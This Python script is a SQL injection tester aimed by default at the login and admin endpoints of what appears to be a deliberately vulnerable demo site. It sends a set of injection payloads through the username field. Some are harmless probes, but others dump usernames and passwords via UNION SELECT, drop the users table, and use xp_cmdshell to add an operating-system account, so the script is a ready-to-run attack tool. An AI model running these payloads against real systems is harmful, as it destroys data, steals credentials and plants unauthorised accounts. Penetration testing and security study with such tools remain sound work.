import requests
from urllib.parse import urljoin
import logging

class SQLInjectionTester:
    def __init__(self, base_url: str, endpoints: list[str] = None, timeout: float = 5.0):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = timeout
        self.endpoints = endpoints or ['/']

    def _post(self, path: str, data: dict):
        url = urljoin(self.base_url, path)
        resp = self.session.post(url, data=data, timeout=self.timeout)
        resp.raise_for_status()
        return resp

    def classic_sql_injection(self):
        """Test for Classic SQL Injection"""
        payload = "' OR 1=1 --"
        return self.test_payload(payload)

    def or_condition_injection(self):
        """Test for OR condition SQL Injection"""
        payload = "' OR 'a'='a"
        return self.test_payload(payload)

    def union_based_injection(self):
        """Test for Union-based SQL Injection"""
        payload = "' UNION SELECT NULL, username, password FROM users --"
        return self.test_payload(payload)

    def drop_table_injection(self):
        """Test for DROP TABLE SQL Injection"""
        payload = "'; DROP TABLE users --"
        return self.test_payload(payload)

    def comment_based_injection(self):
        """Test for Comment-based SQL Injection"""
        payload = "admin'--"
        return self.test_payload(payload)

    def always_true_condition(self):
        """Test for Always True Condition SQL Injection"""
        payload = "' OR '1'='1' -- "
        return self.test_payload(payload)

    def semicolon_comment_injection(self):
        """Test for Semicolon-based SQL Injection"""
        payload = "'; --"
        return self.test_payload(payload)

    def xp_cmdshell_injection(self):
        """Test for Command execution SQL Injection (dangerous)"""
        payload = "'; EXEC xp_cmdshell('net user test testpass /add') --"
        return self.test_payload(payload)

    def test_payload(self, payload):
        """Helper function to test each payload"""
        vuln_found = False
        for path in self.endpoints:
            data = {'username': payload, 'password': 'any'}  # Using the payload for the username field
            try:
                response = self._post(path, data)
                if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                    logging.warning(f"SQL Injection vulnerability detected on {path} with payload: {payload}")
                    vuln_found = True
                    return True, payload
            except requests.exceptions.RequestException as e:
                logging.error(f"Error testing {path} with payload {payload}: {e}")
                continue
        return False, None

    def print_results(self):
        """Helper function to print results in a formatted way"""
        for name, (vuln, info) in self.results.items():
            # Format the output to match your desired style
            vuln_str = "None" if vuln is None else vuln  # Show "None" if no vulnerability
            info_str = info if info is not None else "None"  # If no info, display "None"
            
            # Print formatted result
            line = f"{name:25s} → vulnerability:{vuln_str}"
            line += f"  info={info_str}"  # Append info or "None" if no info is available
            print(line)

    def test_sql_injection(self):
        """Run all SQL Injection tests"""
        # Create a dictionary to hold the results of each test
        self.results = {}
        self.results['classic_sql_injection'] = self.classic_sql_injection()
        self.results['or_condition_injection'] = self.or_condition_injection()
        self.results['union_based_injection'] = self.union_based_injection()
        self.results['drop_table_injection'] = self.drop_table_injection()
        self.results['comment_based_injection'] = self.comment_based_injection()
        self.results['always_true_condition'] = self.always_true_condition()
        self.results['semicolon_comment_injection'] = self.semicolon_comment_injection()
        self.results['xp_cmdshell_injection'] = self.xp_cmdshell_injection()

        # Print all the results
        self.print_results()

        # Return the results dictionary
        return self.results
    
if __name__ == "__main__":
    base_url = "https://demo.testfire.net/index.jsp"  # Replace with the actual URL of the site you want to test
    tester = SQLInjectionTester(base_url, endpoints=["/login", "/admin"])  # List your endpoints here
    
    # Test for SQL Injection
    tester.test_sql_injection()
    
    # Print the results of the tests
    tester.print_results()